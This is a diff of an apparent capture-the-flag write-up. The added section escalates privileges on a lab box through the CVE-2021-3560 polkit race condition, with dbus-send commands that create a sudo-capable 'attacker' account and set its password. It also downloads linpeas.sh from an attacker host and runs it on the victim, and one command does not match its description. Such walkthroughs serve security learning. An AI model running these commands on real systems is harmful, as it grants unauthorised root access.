@@ -129,12 +129,12 @@ serve(app, host="127.0.0.1", port=8000)
 sudo apt update && sudo apt install python3-venv
 python3 -m venv poc-venv
 source poc-venv/bin/activate
+pip3 install flask requests waitress
 ```
 
 **Kali(poc-venv)**
 
 ```
-pip3 install flask requests waitress
 subl poc.py
 ```
 
@@ -230,6 +230,8 @@ Do the same steps as before to use the cookie and you can see the username is no
 
 <figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
+## **Inital Shell**
+
 **Kali(poc-venv)**
 
 ```
@@ -238,7 +240,7 @@ subl poc3.py
 
 Changing the code to see if it will evaluate 7\*6 in the username field
 
-**poc2.py**
+**poc3.py**
 
 ```
 #!/usr/bin/python3
@@ -284,7 +286,109 @@ Copy the cookie into the browser again and shortly you should receive a connecti
 
 
 
+## Privilege Escalation&#x20;
 
+Get autocomplete
+
+**Victim**
+
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+ctrl + Z
+stty raw -echo;fg
+```
+
+CVE-2021-3560 is, fortunately, a very easy vulnerability to exploit if the conditions are right. The vuln is effectively a race condition in the policy toolkit authentication system.
+
+There is already a TryHackMe room which covers this vulnerability in much more depth [here](https://tryhackme.com/room/polkit), so please complete that before continuing if you haven't already done so as we will not cover the "behind the scenes" of the vuln in nearly as much depth here.
+
+Effectively, we need to send a custom dbus message to the accounts-daemon, and kill it approximately halfway through execution (after it gets received by polkit, but before polkit has a chance to verify that it's legitimate -- or, not, in this case).
+
+We will be trying to create a new account called "attacker" with sudo privileges. Before we do so, let's check to see if an account with this name already exists:
+
+**Victim**
+
+```
+apt list --upgradeable
+```
+
+<figure><img src="../../.gitbook/assets/image (914).png" alt=""><figcaption></figcaption></figure>
+
+This attempts to create our new account, and times how long it takes for the command to finish. In the target machine this should be _about_ 11 milliseconds. It took us 13 milliseconds
+
+**Victim**
+
+```
+time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
+```
+
+<figure><img src="../../.gitbook/assets/image (915).png" alt=""><figcaption></figcaption></figure>
+
+We now need to take the same dbus message, send it, then cut it off at about halfway through execution. 5 milliseconds tends to work fairly well for this box.
+
+_**Note:** you may need to repeat this a few times with different delays before the account is created._
+
+**Victim**
+
+```
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
+```
+
+<figure><img src="../../.gitbook/assets/image (916).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+id attacker
+```
+
+<figure><img src="../../.gitbook/assets/image (917).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
+```
+
+<figure><img src="../../.gitbook/assets/image (918).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+su attacker
+Password: Expl01ted
+```
+
+<figure><img src="../../.gitbook/assets/image (919).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+sudo -i
+Password: Expl01ted
+```
+
+<figure><img src="../../.gitbook/assets/image (920).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+**Kali**
+
+```
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+python2 -m SimpleHTTPServer 82
+```
+
+**Victim**
+
+```
+cd /tmp/
+wget http://$KALI:81/linpeas.sh
+chmod +x linpeas.sh 
+./linpeas.sh
+```
 
 
 
